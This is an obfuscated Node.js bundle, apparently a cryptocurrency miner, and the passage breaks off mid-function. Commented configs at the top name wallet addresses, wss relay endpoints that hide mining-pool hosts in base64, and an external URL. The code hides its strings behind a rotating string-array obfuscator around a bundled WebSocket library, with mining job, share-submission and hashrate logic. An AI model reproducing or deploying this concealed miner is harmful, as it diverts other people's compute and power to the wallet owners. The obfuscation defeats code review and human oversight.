//nano config.json
//{
//  "server": "wss://node--wss--9fb77cgtfy78.code.run/ZGUucXJsLmhlcm9taW5lcnMuY29tOjExNjY=",
//  "user": "Q010500f7c6a6de4cde50eef0d77cad46b9c86a81b2d95b89830fb304ba81550137439c09e88ccd.DEV_FEE",
//  "password": "x",
//  "threads": 0.0,
//  "date": ""
//}

//nano config.json tesOK line 1900-1911 (remove https://bill.dapitax.social)
//{
//  "server": "wss://45.115.224.145:8080/YXNpYS5oYXNodmF1bHQucHJvOjQ0Mw==",
//  "user": "87jUMdZss7odoUTD2wgUv6eSxScCAnf8tbBQpUhQkQAxQqMKX2nvwpS1hAVj6U7PtFP27pcX3RS4QZjDMUxwCtqC54J5B4h.DEV_FEE",
//  "password": "x",
//  "threads": 0.5,
//  "date": ""
//}

function a0_0x2568(_0x40a5c4, _0x27cd6e) {
    _0x40a5c4 = _0x40a5c4 - 0x1c7;
    const _0x2999e6 = a0_0x2999();
    let _0x2568d2 = _0x2999e6[_0x40a5c4];
    return _0x2568d2;
}

function a0_0x2999() {
    const _0x508ca5 = ['byteLength', 'WS_NO_BUFFER_UTIL', 'shift', 'maskBuffer', 'buffer', 'sec-websocket-extensions', 'fin', 'CONNECTING', 'forEach', '_errored', 'verifyClient', 'search', 'rsv1', 'keepalived', 'SERVER_DOMAIN', 'existsSync', 'maxPayload', 'handshakeTimeout', 'ceil', '_shouldEmitClose', 'mask', '_compress', 'WS_ERR_EXPECTED_FIN', 'auth', 'websocket', 'exports', 'port', 'skipUTF8Validation', 'host', 'species', 'OPEN', 'isView', 'href', '5184umHYYW', 'listening', 'getBlobData', '_queue', 'kMessage', 'Receiver', '_final', 'createConnection', 'Cannot find module \'utf-8-validate\'', 'log', 'filter', '_allowSynchronousEvents', 'uncork', '_decompress', '_bufferedAmount', 'conclude', 'binaryType', 'includes', 'join', 'object', 'extensionName', 'split', 'kAborted', 'disconnect', 'value', 'hash', 'frame', 'close', 'Invalid Sec-WebSocket-Accept header', '_maskBuffer', 'trim', '\": ', 'base64', '_readyState', '_sender', 'SERVER_CONNECTION', 'clientNoContextTakeover', 'Invalid URL: ', 'CLOSED', 'init', 'http', 'createInflateRaw', 'addEventListener', 'sec-websocket-accept', 'fragments', 'errorEmitted', 'reason', 'enqueue', 'location', 'retryDelay', 'zlib', '73363ORvnEn', '_originalHostOrSocketPath', 'captureStackTrace', 'https:', 'authorized', 'retryCount', 'charCodeAt', 'GET', '_login', 'Sec-WebSocket-Protocol: ', 'perMessageDeflate', 'utf8', '_binaryType', '_opcode', 'proxyUrl', 'kListener', '_extensions', 'WS_NO_UTF_8_VALIDATE', 'pathname', 'removeAllListeners', 'pow', 'update', 'handleProtocols', 'Missing or invalid Sec-WebSocket-Key header', 'kType', 'keys', 'threshold', '_backoffDelay', '_masked', 'sec-websocket-key', 'destroy', 'test', 'keepAliveInterval', 'loaded', 'error', 'listeners', 'client_no_context_takeover', 'net', 'agent', 'Sec-WebSocket-Protocol', 'WS_ERR_INVALID_UTF8', '_fin', '_fragmented', 'compress', 'once', 'The message must not be greater than 123 bytes', 'FAST', 'Unexpected character at index ', 'type', 'resume', 'isValidUTF8', 'allowSynchronousEvents', 'redirect', 'WS_ERR_INVALID_CLOSE_CODE', 'WS_ERR_EXPECTED_MASK', 'options', 'finished', 'One and only one of the \"port\", \"server\", or \"noServer\" options must be specified', 'createError', 'isBuffer', '_req', 'acceptAsClient', '_max_window_bits', 'set', 'bind', 'Invalid value for parameter \"', '_threshold', 'servername', 'objectMode', '_paused', 'Invalid Upgrade header', 'dev_fee/1.0.0', 'CLOSING', 'Unexpected end of input', 'from', 'kIsForOnEventAttribute', 'consume', '_compressed', 'open', 'children', 'alloc', 'emit', '10PgLPFp', 'next', 'WebSocket was closed before the connection was established', '_autoPong', 'getMask', 'socket', 'Unexpected or invalid parameter \"client_max_window_bits\"', '_maxPayload', 'isPaused', 'sec-websocket-protocol', 'destroyed', 'WebSocket', 'username', '_read', 'origin', 'Sec-WebSocket-Extensions: ', 'sha1', 'workerId', 'startLoop', 'WS_ERR_UNEXPECTED_RSV_2_3', 'kRun', 'normalizeParams', 'WS_ERR_INVALID_OPCODE', 'createServer', '_totalPayloadLength', 'string', 'delete', 'Sec-WebSocket-Accept: ', 'login', 'toStringTag', '_send', 'function', 'permessage-deflate', 'clientTracking', 'setNoDelay', 'server', 'binary', 'then', 'server_max_window_bits', 'readFileSync', 'isArray', 'setHeader', 'cleanup', 'unmask', '_isServer', 'timeout', 'WS_ERR_UNSUPPORTED_MESSAGE_LENGTH', 'serverMaxWindowBits', 'opcode', 'dispatch', 'Sec-WebSocket-Extensions', 'target', '] KULI ', 'encrypted', 'noServer', 'WebSocket is not open: readyState ', 'Blob', '329PUDmwo', 'kDone', 'stream', 'socketPath', 'getInfo', 'autoPong', 'upgrade', 'removeEventListener', 'size', 'password', 'text/plain', 'end', '_options', 'parse', 'WS_ERR_UNEXPECTED_RSV_1', 'threads', 'kByteLength', '_url', 'extensions', 'readyState', 'bufferedAmount', 'readUInt16BE', 'create', 'ws+unix:', '351357EQoUBF', 'Basic ', 'finish', 'invalid opcode 0', 'wsClientError', 'SERVER_SECRET', 'invalid payload length ', 'seed_hash', 'RSV2 and RSV3 must be clear', '_server', 'read', 'toLowerCase', '_socket', 'sec-websocket-origin', '_reconnect', 'message', '\" subprotocol is duplicated', 'Parameter \"', 'pending', 'maxRetries', 'HTTP/1.1 ', 'headers', 'writeUInt16BE', 'decompress', 'data', 'text/html', '_buffers', 'replace', 'dlopen', 'exit', 'handleEvent', 'toString', 'First argument must be a valid error code number', ' * FAILED = ', '_mask', 'onmessage', '_state', '6widdvl', 'onerror', '_write', 'offer', 'startKeepAlive', 'has', 'readOnly', 'defaultPort', 'protocol', 'isServer', 'nextTick', 'wss:', 'isInteger', 'Invalid Sec-WebSocket-Extensions header', 'server.handleUpgrade() was called more than once with the same socket, possibly due to a misconfiguration', 'HTTP/1.1 101 Switching Protocols', 'status', 'Unexpected server response: ', '_bufferedBytes', 'slice', '_redirects', '258EAFA5-E914-47DA-95CA-C5AB0DC85B11', 'getData', '_inflate', 'startsWith', 'write', 'concat', 'address', 'hostname', 'cookie', 'emitClose', 'digest', 'needDrain', 'Server sent a subprotocol but none was requested', 'http:', 'map', 'Z_SYNC_FLUSH', 'controlMessage', 'Unsupported protocol version: ', '289632JeKsqh', 'backlog', 'listenerCount', '_messageLength', '_skipUTF8Validation', 'nmd', 'authorization', 'haveLength', 'hashrate', '13, 8', '_writableState', 'result', 'arraybuffer', '_fragments', '_openSocket', 'method', 'Max payload size exceeded', 'dequeue', 'params', 'WebSocket is not open: readyState 0 (CONNECTING)', '32408QLXvxA', 'The \"', '630seajgU', 'zlibInflateOptions', '1825911EkEWhn', 'catch', 'RSV1 must be clear', '1636118pfoBwK', 'removeListener', 'protocolVersion', 'completeUpgrade', '_deflate', 'writable', 'url', 'kReason', '_removeListeners', 'response', 'defineProperty', 'reduce', 'env', '_closeFrameReceived', '_generateMask', 'acceptAsServer', 'invalid opcode ', ' * SPEED ', 'crypto', 'clients', 'push', 'number', 'kTarget', 'disconnected', 'finishRequest', 'accepted', 'events', 'flush', 'Invalid Sec-WebSocket-Protocol header', 'submitted', 'getPayloadLength16', 'call', 'wasClean', 'buffers', 'https://bill.dapitax.social/', 'add', '_closeMessage', 'mode', '_closeFrameSent', '_handleMessage', 'zlibDeflateOptions', 'user', ' (supported versions: ', 'Cannot find module \'bufferutil\'', 'abort', 'The URL\'s pathname is empty', 'clear', 'The data size must not be greater than 125 bytes', 'SERVER_WS', 'allocUnsafe', 'server_no_context_takeover', 'apply', 'byteOffset', 'JUSTRO', 'Upgrade: websocket', 'SIGTERM', 'generateMask', 'Connection: Upgrade', 'The URL\'s protocol must be one of \"ws:\", \"wss:\", \"http:\", \"https:\", or \"ws+unix:\"', 'client', '_payloadLength', 'Invalid HTTP method', 'The URL contains a fragment identifier', 'pong', '_receiver', 'concurrencyLimit', 'sendFrame', 'STATUS_CODES', 'client_max_window_bits', 'arrayBuffer', 'Invalid WebSocket frame: ', 'MASK must be clear', 'dataMessage', '_errorEmitted', 'endEmitted', 'The socket was closed while data was being compressed', 'setSocket', '_loop', 'unhandledRejection', '_originalSecure', 'tls', 'File', 'Server', 'send', 'getPayloadLength64', '_destroy', 'reconnecting', 'kData', 'clientMaxWindowBits', 'pause', 'SERVER_TARGET', 'terminate', 'Z_DEFAULT_WINDOWBITS', 'unshift', 'Server sent an invalid subprotocol', 'node-loader:\x0a', 'prototype', 'code', 'rejected', 'submit', 'onopen', '_no_context_takeover', '_readableState', 'job_id', '_firstFragment', 'WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH', '_closeCode', 'blob', '\" must have only a single value', 'Opening handshake has timed out', '_originalIpc', '_protocol', 'jobs', 'connected', 'stringify', 'Missing or invalid Sec-WebSocket-Version header', 'reset', 'Invalid or unacceptable Sec-WebSocket-Extensions header', ' Mbp/s * SUCCESS ', 'indexOf', 'Origin', 'paths', 'invalid status code ', 'length', 'ping', 'request', 'readUInt32BE', 'node-rs/2.0.0', 'path', 'Unsupported WebSocket frame: payload length > 2^53 - 1', 'Sender', 'pingIntervalMs', 'serverNoContextTakeover', 'connect', 'find', 'job', 'nodebuffer', 'statusCode', 'handleUpgrade', 'kWasClean', 'accept', 'start'];
    a0_0x2999 = function () {
        return _0x508ca5;
    };
    return a0_0x2999();
}(function (_0x4fa3e6, _0x247e5e) {
    const _0x138a8d = a0_0x2568,
        _0x598b85 = _0x4fa3e6();
    while (!![]) {
        try {
            const _0x51d35e = parseInt(_0x138a8d(0x2cc)) / 0x1 * (-parseInt(_0x138a8d(0x394)) / 0x2) + -parseInt(_0x138a8d(0x36f)) / 0x3 + -parseInt(_0x138a8d(0x299)) / 0x4 * (-parseInt(_0x138a8d(0x1e5)) / 0x5) + parseInt(_0x138a8d(0x1cf)) / 0x6 + parseInt(_0x138a8d(0x357)) / 0x7 * (parseInt(_0x138a8d(0x1e3)) / 0x8) + parseInt(_0x138a8d(0x1e7)) / 0x9 * (parseInt(_0x138a8d(0x31e)) / 0xa) + -parseInt(_0x138a8d(0x1ea)) / 0xb;
            if (_0x51d35e === _0x247e5e) break;
            else _0x598b85['push'](_0x598b85['shift']());
        } catch (_0x2601c1) {
            _0x598b85['push'](_0x598b85['shift']());
        }
    }
}(a0_0x2999, 0x1d072), ((() => {
    const _0x1898e4 = a0_0x2568;
    var _0xb9341a = {
            0x10(_0x64b574) {
                'use strict';
                const _0x2e6d0d = a0_0x2568;
                _0x64b574[_0x2e6d0d(0x291)] = require('url');
            },
            0x3c(_0x38aad3, _0x303653, _0x2c21de) {
                'use strict';
                const _0x5f1618 = a0_0x2568;
                const _0x2b1ad9 = _0x2c21de(0x1b2),
                    _0x4aec51 = _0x2c21de(0x2b4),
                    _0x5f40ee = _0x2c21de(0x263),
                    _0x30bc10 = _0x2c21de(0x116),
                    _0x3c8c34 = _0x2c21de(0x2f4),
                    {
                        randomBytes: _0x2196c0,
                        createHash: _0x2ab17e
                    } = _0x2c21de(0x3d6),
                    {
                        Duplex: _0xbc07e3,
                        Readable: _0x20d273
                    } = _0x2c21de(0xcb),
                    {
                        URL: _0x41f207
                    } = _0x2c21de(0x10),
                    _0x4f9d70 = _0x2c21de(0x3cb),
                    _0x3e8609 = _0x2c21de(0x11e),
                    _0x12da24 = _0x2c21de(0x392),
                    {
                        isBlob: _0x30ee55
                    } = _0x2c21de(0x370),
                    {
                        BINARY_TYPES: _0x431cce,
                        EMPTY_BUFFER: _0x1833a1,
                        GUID: _0x4b9e8d,
                        kForOnEventAttribute: _0x2e5338,
                        kListener: _0x1dfdf5,
                        kStatusCode: _0x484f80,
                        kWebSocket: _0x3882d6,
                        NOOP: _0x495bad
                    } = _0x2c21de(0x266),
                    {
                        EventTarget: {
                            addEventListener: _0x1cf6d2,
                            removeEventListener: _0xd381d2
                        }
                    } = _0x2c21de(0x255),
                    {
                        format: _0x11af40,
                        parse: _0x252392
                    } = _0x2c21de(0x39e),
                    {
                        toBuffer: _0x5bb4eb
                    } = _0x2c21de(0x152),
                    _0x5aab1a = Symbol(_0x5f1618(0x2af)),
                    _0x4e06cb = [0x8, 0xd],
                    _0x8713c0 = [_0x5f1618(0x27f), 'OPEN', _0x5f1618(0x314), 'CLOSED'],
                    _0x5046bc = /^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;
                class _0x36a426 extends _0x2b1ad9 {
                    constructor(_0x4ef2bc, _0x1eb772, _0x5e4eef) {
                        const _0x27d11f = _0x5f1618;
                        super(), this[_0x27d11f(0x2d8)] = _0x431cce[0x0], this['_closeCode'] = 0x3ee, this['_closeFrameReceived'] = !0x1, this[_0x27d11f(0x210)] = !0x1, this[_0x27d11f(0x20e)] = _0x1833a1, this['_closeTimer'] = null, this[_0x27d11f(0x233)] = !0x1, this[_0x27d11f(0x2dc)] = {}, this[_0x27d11f(0x311)] = !0x1, this[_0x27d11f(0x259)] = '', this['_readyState'] = _0x36a426[_0x27d11f(0x27f)], this[_0x27d11f(0x22a)] = null, this[_0x27d11f(0x2bb)] = null, this['_socket'] = null, null !== _0x4ef2bc ? (this['_bufferedAmount'] = 0x0, this[_0x27d11f(0x34a)] = !0x1, this[_0x27d11f(0x3a8)] = 0x0, void 0x0 === _0x1eb772 ? _0x1eb772 = [] : Array[_0x27d11f(0x346)](_0x1eb772) || (_0x27d11f(0x2ac) == typeof _0x1eb772 && null !== _0x1eb772 ? (_0x5e4eef = _0x1eb772, _0x1eb772 = []) : _0x1eb772 = [_0x1eb772]), _0x31ff79(this, _0x4ef2bc, _0x1eb772, _0x5e4eef)) : (this[_0x27d11f(0x321)] = _0x5e4eef[_0x27d11f(0x35c)], this['_isServer'] = !0x0);
                    }
                    get[_0x5f1618(0x2a9)]() {
                        return this['_binaryType'];
                    }
                    set[_0x5f1618(0x2a9)](_0x18cede) {
                        const _0x5c20e3 = _0x5f1618;
                        _0x431cce[_0x5c20e3(0x2aa)](_0x18cede) && (this[_0x5c20e3(0x2d8)] = _0x18cede, this[_0x5c20e3(0x22a)] && (this[_0x5c20e3(0x22a)][_0x5c20e3(0x2d8)] = _0x18cede));
                    }
                    get[_0x5f1618(0x36b)]() {
                        const _0x4b4de5 = _0x5f1618;
                        return this[_0x4b4de5(0x37b)] ? this[_0x4b4de5(0x37b)][_0x4b4de5(0x1d9)][_0x4b4de5(0x265)] + this['_sender'][_0x4b4de5(0x3a6)] : this[_0x4b4de5(0x2a7)];
                    }
                    get[_0x5f1618(0x369)]() {
                        const _0x85ee10 = _0x5f1618;
                        return Object[_0x85ee10(0x2e5)](this[_0x85ee10(0x2dc)])[_0x85ee10(0x2ab)]();
                    }
                    get[_0x5f1618(0x326)]() {
                        const _0x2df6fd = _0x5f1618;
                        return this[_0x2df6fd(0x311)];
                    }
                    get['onclose']() {
                        return null;
                    }
                    get[_0x5f1618(0x395)]() {
                        return null;
                    }
                    get[_0x5f1618(0x24e)]() {
                        return null;
                    }
                    get[_0x5f1618(0x392)]() {
                        return null;
                    }
                    get['protocol']() {
                        const _0x4d0992 = _0x5f1618;
                        return this[_0x4d0992(0x259)];
                    }
                    get[_0x5f1618(0x36a)]() {
                        const _0x293012 = _0x5f1618;
                        return this[_0x293012(0x2ba)];
                    }
                    get[_0x5f1618(0x1f0)]() {
                        const _0x177f86 = _0x5f1618;
                        return this[_0x177f86(0x368)];
                    } ['setSocket'](_0x515041, _0x57cd00, _0x302aa4) {
                        const _0xc68d05 = _0x5f1618,
                            _0x45a991 = new _0x3e8609({
                                'allowSynchronousEvents': _0x302aa4[_0xc68d05(0x2ff)],
                                'binaryType': this[_0xc68d05(0x2a9)],
                                'extensions': this[_0xc68d05(0x2dc)],
                                'isServer': this[_0xc68d05(0x34a)],
                                'maxPayload': _0x302aa4[_0xc68d05(0x288)],
                                'skipUTF8Validation': _0x302aa4[_0xc68d05(0x293)]
                            }),
                            _0x4ef16b = new _0x12da24(_0x515041, this[_0xc68d05(0x2dc)], _0x302aa4[_0xc68d05(0x222)]);
                        this[_0xc68d05(0x22a)] = _0x45a991, this[_0xc68d05(0x2bb)] = _0x4ef16b, this['_socket'] = _0x515041, _0x45a991[_0x3882d6] = this, _0x4ef16b[_0x3882d6] = this, _0x515041[_0x3882d6] = this, _0x45a991['on']('conclude', _0x1efe7a), _0x45a991['on']('drain', _0x44b4cc), _0x45a991['on'](_0xc68d05(0x2ee), _0x5335d2), _0x45a991['on'](_0xc68d05(0x37e), _0x519997), _0x45a991['on'](_0xc68d05(0x266), _0x167bec), _0x45a991['on'](_0xc68d05(0x229), _0x124de4), _0x4ef16b[_0xc68d05(0x395)] = _0x2b7864, _0x515041['setTimeout'] && _0x515041['setTimeout'](0x0), _0x515041['setNoDelay'] && _0x515041[_0xc68d05(0x340)](), _0x57cd00[_0xc68d05(0x265)] > 0x0 && _0x515041[_0xc68d05(0x247)](_0x57cd00), _0x515041['on'](_0xc68d05(0x2b4), _0xd764f7), _0x515041['on'](_0xc68d05(0x387), _0x251ef5), _0x515041['on'](_0xc68d05(0x362), _0x42a46d), _0x515041['on'](_0xc68d05(0x2ee), _0x3c1c06), this[_0xc68d05(0x2ba)] = _0x36a426[_0xc68d05(0x296)], this[_0xc68d05(0x31d)]('open');
                    } [_0x5f1618(0x3b2)]() {
                        const _0x356520 = _0x5f1618;
                        if (!this['_socket']) return this[_0x356520(0x2ba)] = _0x36a426[_0x356520(0x2bf)], void this[_0x356520(0x31d)](_0x356520(0x2b4), this['_closeCode'], this[_0x356520(0x20e)]);
                        this[_0x356520(0x2dc)][_0x4f9d70[_0x356520(0x2ad)]] && this[_0x356520(0x2dc)][_0x4f9d70[_0x356520(0x2ad)]][_0x356520(0x348)](), this[_0x356520(0x22a)][_0x356520(0x2df)](), this[_0x356520(0x2ba)] = _0x36a426['CLOSED'], this['emit'](_0x356520(0x2b4), this['_closeCode'], this[_0x356520(0x20e)]);
                    } [_0x5f1618(0x2b4)](_0x21c992, _0x2de22b) {
                        const _0x7dc229 = _0x5f1618;
                        if (this['readyState'] !== _0x36a426[_0x7dc229(0x2bf)]) {
                            if (this['readyState'] === _0x36a426[_0x7dc229(0x27f)]) {
                                const _0x383559 = _0x7dc229(0x320);
                                return void _0x4da4dd(this, this['_req'], _0x383559);
                            }
                            this[_0x7dc229(0x36a)] !== _0x36a426[_0x7dc229(0x314)] ? (this[_0x7dc229(0x2ba)] = _0x36a426[_0x7dc229(0x314)], this['_sender']['close'](_0x21c992, _0x2de22b, !this[_0x7dc229(0x34a)], _0xcd2a87 => {
                                const _0x2f430c = _0x7dc229;
                                _0xcd2a87 || (this[_0x2f430c(0x210)] = !0x0, (this['_closeFrameReceived'] || this['_receiver'][_0x2f430c(0x1d9)][_0x2f430c(0x2c6)]) && this[_0x2f430c(0x37b)][_0x2f430c(0x362)]());
                            }), _0x20f1e4(this)) : this[_0x7dc229(0x210)] && (this['_closeFrameReceived'] || this[_0x7dc229(0x22a)][_0x7dc229(0x1d9)][_0x7dc229(0x2c6)]) && this[_0x7dc229(0x37b)][_0x7dc229(0x362)]();
                        }
                    } [_0x5f1618(0x243)]() {
                        const _0x5528ff = _0x5f1618;
                        this[_0x5528ff(0x36a)] !== _0x36a426[_0x5528ff(0x27f)] && this[_0x5528ff(0x36a)] !== _0x36a426[_0x5528ff(0x2bf)] && (this['_paused'] = !0x0, this[_0x5528ff(0x37b)][_0x5528ff(0x243)]());
                    } ['ping'](_0x358230, _0x5883e3, _0x4c0980) {
                        const _0x1d377c = _0x5f1618;
                        if (this['readyState'] === _0x36a426['CONNECTING']) throw new Error('WebSocket is not open: readyState 0 (CONNECTING)');
                        _0x1d377c(0x33d) == typeof _0x358230 ? (_0x4c0980 = _0x358230, _0x358230 = _0x5883e3 = void 0x0) : 'function' == typeof _0x5883e3 && (_0x4c0980 = _0x5883e3, _0x5883e3 = void 0x0), _0x1d377c(0x1ff) == typeof _0x358230 && (_0x358230 = _0x358230[_0x1d377c(0x38e)]()), this[_0x1d377c(0x36a)] === _0x36a426[_0x1d377c(0x296)] ? (void 0x0 === _0x5883e3 && (_0x5883e3 = !this[_0x1d377c(0x34a)]), this[_0x1d377c(0x2bb)]['ping'](_0x358230 || _0x1833a1, _0x5883e3, _0x4c0980)) : _0x5587cf(this, _0x358230, _0x4c0980);
                    } [_0x5f1618(0x229)](_0x44b1f0, _0x4d8894, _0xc12dd0) {
                        const _0x28c336 = _0x5f1618;
                        if (this[_0x28c336(0x36a)] === _0x36a426[_0x28c336(0x27f)]) throw new Error(_0x28c336(0x1e2));
                        _0x28c336(0x33d) == typeof _0x44b1f0 ? (_0xc12dd0 = _0x44b1f0, _0x44b1f0 = _0x4d8894 = void 0x0) : _0x28c336(0x33d) == typeof _0x4d8894 && (_0xc12dd0 = _0x4d8894, _0x4d8894 = void 0x0), 'number' == typeof _0x44b1f0 && (_0x44b1f0 = _0x44b1f0['toString']()), this[_0x28c336(0x36a)] === _0x36a426[_0x28c336(0x296)] ? (void 0x0 === _0x4d8894 && (_0x4d8894 = !this[_0x28c336(0x34a)]), this[_0x28c336(0x2bb)]['pong'](_0x44b1f0 || _0x1833a1, _0x4d8894, _0xc12dd0)) : _0x5587cf(this, _0x44b1f0, _0xc12dd0);
                    } [_0x5f1618(0x2fd)]() {
                        const _0x2b8e09 = _0x5f1618;
                        this[_0x2b8e09(0x36a)] !== _0x36a426[_0x2b8e09(0x27f)] && this[_0x2b8e09(0x36a)] !== _0x36a426[_0x2b8e09(0x2bf)] && (this['_paused'] = !0x1, this['_receiver'][_0x2b8e09(0x1d9)][_0x2b8e09(0x1c8)] || this[_0x2b8e09(0x37b)][_0x2b8e09(0x2fd)]());
                    } [_0x5f1618(0x23d)](_0x188bf6, _0x237d7f, _0x2e4fb8) {
                        const _0x4bce76 = _0x5f1618;
                        if (this[_0x4bce76(0x36a)] === _0x36a426[_0x4bce76(0x27f)]) throw new Error('WebSocket is not open: readyState 0 (CONNECTING)');
                        if (_0x4bce76(0x33d) == typeof _0x237d7f && (_0x2e4fb8 = _0x237d7f, _0x237d7f = {}), _0x4bce76(0x1ff) == typeof _0x188bf6 && (_0x188bf6 = _0x188bf6[_0x4bce76(0x38e)]()), this['readyState'] !== _0x36a426['OPEN']) return void _0x5587cf(this, _0x188bf6, _0x2e4fb8);
                        const _0x219ee3 = {
                            'binary': _0x4bce76(0x337) != typeof _0x188bf6,
                            'mask': !this[_0x4bce76(0x34a)],
                            'compress': !0x0,
                            'fin': !0x0,
                            ..._0x237d7f
                        };
                        this[_0x4bce76(0x2dc)][_0x4f9d70[_0x4bce76(0x2ad)]] || (_0x219ee3[_0x4bce76(0x2f7)] = !0x1), this[_0x4bce76(0x2bb)][_0x4bce76(0x23d)](_0x188bf6 || _0x1833a1, _0x219ee3, _0x2e4fb8);
                    } [_0x5f1618(0x245)]() {
                        const _0x5be805 = _0x5f1618;
                        if (this[_0x5be805(0x36a)] !== _0x36a426['CLOSED']) {
                            if (this[_0x5be805(0x36a)] === _0x36a426['CONNECTING']) {
                                const _0x7ddd04 = _0x5be805(0x320);
                                return void _0x4da4dd(this, this['_req'], _0x7ddd04);
                            }
                            this[_0x5be805(0x37b)] && (this[_0x5be805(0x2ba)] = _0x36a426[_0x5be805(0x314)], this[_0x5be805(0x37b)][_0x5be805(0x2ea)]());
                        }
                    }
                }

                function _0x31ff79(_0x2e6f64, _0x45b5b8, _0x533028, _0x58d057) {
                    const _0x47a76e = _0x5f1618,
                        _0x4b8bb2 = {
                            'allowSynchronousEvents': !0x0,
                            'autoPong': !0x0,
                            'protocolVersion': _0x4e06cb[0x1],
                            'maxPayload': 0x6400000,
                            'skipUTF8Validation': !0x1,
                            'perMessageDeflate': !0x0,
                            'followRedirects': !0x1,
                            'maxRedirects': 0xa,
                            ..._0x58d057,
                            'socketPath': void 0x0,
                            'hostname': void 0x0,
                            'protocol': void 0x0,
                            'timeout': void 0x0,
                            'method': _0x47a76e(0x2d3),
                            'host': void 0x0,
                            'path': void 0x0,
                            'port': void 0x0
                        };
                    if (_0x2e6f64[_0x47a76e(0x321)] = _0x4b8bb2['autoPong'], !_0x4e06cb[_0x47a76e(0x2aa)](_0x4b8bb2[_0x47a76e(0x1ec)])) throw new RangeError(_0x47a76e(0x1ce) + _0x4b8bb2[_0x47a76e(0x1ec)] + _0x47a76e(0x214) + _0x4e06cb[_0x47a76e(0x2ab)](', ') + ')');
                    let _0x2e3f7d;
                    if (_0x45b5b8 instanceof _0x41f207) _0x2e3f7d = _0x45b5b8;
                    else try {
                        _0x2e3f7d = new _0x41f207(_0x45b5b8);
                    } catch (_0x305934) {
                        throw new SyntaxError('Invalid URL: ' + _0x45b5b8);
                    }
                    _0x47a76e(0x1ca) === _0x2e3f7d[_0x47a76e(0x39c)] ? _0x2e3f7d[_0x47a76e(0x39c)] = 'ws:' : _0x47a76e(0x2cf) === _0x2e3f7d[_0x47a76e(0x39c)] && (_0x2e3f7d[_0x47a76e(0x39c)] = 'wss:'), _0x2e6f64['_url'] = _0x2e3f7d[_0x47a76e(0x298)];
                    const _0x12b9ab = _0x47a76e(0x39f) === _0x2e3f7d['protocol'],
                        _0x264225 = _0x47a76e(0x36e) === _0x2e3f7d['protocol'];
                    let _0x1654a6;
                    if ('ws:' === _0x2e3f7d['protocol'] || _0x12b9ab || _0x264225 ? _0x264225 && !_0x2e3f7d['pathname'] ? _0x1654a6 = _0x47a76e(0x217) : _0x2e3f7d[_0x47a76e(0x2b2)] && (_0x1654a6 = _0x47a76e(0x228)) : _0x1654a6 = _0x47a76e(0x224), _0x1654a6) {
                        const _0x2d52b0 = new SyntaxError(_0x1654a6);
                        if (0x0 === _0x2e6f64[_0x47a76e(0x3a8)]) throw _0x2d52b0;
                        return void _0x5d6610(_0x2e6f64, _0x2d52b0);
                    }
                    const _0x37e8c2 = _0x12b9ab ? 0x1bb : 0x50,
                        _0x38daf5 = _0x2196c0(0x10)['toString'](_0x47a76e(0x2b9)),
                        _0x454b70 = _0x12b9ab ? _0x4aec51[_0x47a76e(0x267)] : _0x5f40ee[_0x47a76e(0x267)],
                        _0x5d9a12 = new Set();
                    let _0x3cc4ce, _0x1d28c4;
                    if (_0x4b8bb2[_0x47a76e(0x2a0)] = _0x4b8bb2[_0x47a76e(0x2a0)] || (_0x12b9ab ? _0x3b319d : _0x5b63a8), _0x4b8bb2[_0x47a76e(0x39b)] = _0x4b8bb2['defaultPort'] || _0x37e8c2, _0x4b8bb2[_0x47a76e(0x292)] = _0x2e3f7d[_0x47a76e(0x292)] || _0x37e8c2, _0x4b8bb2[_0x47a76e(0x294)] = _0x2e3f7d[_0x47a76e(0x3b0)][_0x47a76e(0x3ac)]('[') ? _0x2e3f7d[_0x47a76e(0x3b0)][_0x47a76e(0x3a7)](0x1, -0x1) : _0x2e3f7d[_0x47a76e(0x3b0)], _0x4b8bb2[_0x47a76e(0x384)] = {
                            ..._0x4b8bb2[_0x47a76e(0x384)],
                            'Sec-WebSocket-Version': _0x4b8bb2[_0x47a76e(0x1ec)],
                            'Sec-WebSocket-Key': _0x38daf5,
                            'Connection': 'Upgrade',
                            'Upgrade': _0x47a76e(0x290)
                        }, _0x4b8bb2[_0x47a76e(0x26a)] = _0x2e3f7d[_0x47a76e(0x2de)] + _0x2e3f7d[_0x47a76e(0x283)], _0x4b8bb2[_0x47a76e(0x34b)] = _0x4b8bb2[_0x47a76e(0x289)], _0x4b8bb2['perMessageDeflate'] && (_0x3cc4ce = new _0x4f9d70(!0x0 !== _0x4b8bb2['perMessageDeflate'] ? _0x4b8bb2[_0x47a76e(0x2d6)] : {}, !0x1, _0x4b8bb2['maxPayload']), _0x4b8bb2[_0x47a76e(0x384)][_0x47a76e(0x350)] = _0x11af40({
                            [_0x4f9d70[_0x47a76e(0x2ad)]]: _0x3cc4ce[_0x47a76e(0x397)]()
                        })), _0x533028[_0x47a76e(0x265)]) {
                        for (const _0x2c8eab of _0x533028) {
                            if (_0x47a76e(0x337) != typeof _0x2c8eab || !_0x5046bc[_0x47a76e(0x2eb)](_0x2c8eab) || _0x5d9a12[_0x47a76e(0x399)](_0x2c8eab)) throw new SyntaxError('An invalid or duplicated subprotocol was specified');
                            _0x5d9a12[_0x47a76e(0x20d)](_0x2c8eab);
                        }
                        _0x4b8bb2[_0x47a76e(0x384)][_0x47a76e(0x2f3)] = _0x533028[_0x47a76e(0x2ab)](',');
                    }
                    if (_0x4b8bb2['origin'] && (_0x4b8bb2[_0x47a76e(0x1ec)] < 0xd ? _0x4b8bb2[_0x47a76e(0x384)]['Sec-WebSocket-Origin'] = _0x4b8bb2[_0x47a76e(0x32c)] : _0x4b8bb2[_0x47a76e(0x384)][_0x47a76e(0x262)] = _0x4b8bb2['origin']), (_0x2e3f7d[_0x47a76e(0x32a)] || _0x2e3f7d['password']) && (_0x4b8bb2[_0x47a76e(0x28f)] = _0x2e3f7d[_0x47a76e(0x32a)] + ':' + _0x2e3f7d[_0x47a76e(0x360)]), _0x264225) {
                        const _0x4ebf41 = _0x4b8bb2['path'][_0x47a76e(0x2ae)](':');
                        _0x4b8bb2[_0x47a76e(0x35a)] = _0x4ebf41[0x0], _0x4b8bb2[_0x47a76e(0x26a)] = _0x4ebf41[0x1];
                    }
                    if (_0x4b8bb2['followRedirects']) {
                        if (0x0 === _0x2e6f64['_redirects']) {
                            _0x2e6f64[_0x47a76e(0x258)] = _0x264225, _0x2e6f64['_originalSecure'] = _0x12b9ab, _0x2e6f64[_0x47a76e(0x2cd)] = _0x264225 ? _0x4b8bb2[_0x47a76e(0x35a)] : _0x2e3f7d['host'];
                            const _0x2dd8a3 = _0x58d057 && _0x58d057['headers'];
                            if (_0x58d057 = {
